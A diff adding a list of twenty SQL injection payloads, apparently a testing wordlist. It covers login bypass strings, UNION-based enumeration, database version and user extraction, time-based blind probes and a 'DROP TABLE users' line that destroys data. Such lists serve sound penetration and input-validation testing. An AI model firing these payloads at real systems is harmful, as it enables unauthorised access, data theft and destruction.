@@ -1,0 +1,20 @@
+' OR '1'='1
+' OR 1=1--
+' OR '1'='1' /*
+' UNION SELECT NULL, NULL, NULL--
+') OR ('1'='1
+1' ORDER BY 1--+
+1' ORDER BY 2--+
+1' ORDER BY 3--+
+1' UNION SELECT @@version, user(), database()--
+' OR 1=1 LIMIT 1;--
+1; DROP TABLE users;--
+1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)
+'; WAITFOR DELAY '0:0:5'--
+1' AND SLEEP(5)--
+1' AND (SELECT pg_sleep(5))--
+admin' --
+admin' #
+' or 1=1 or ''='
+" or 1=1 or ""="
+' or 'a'='a
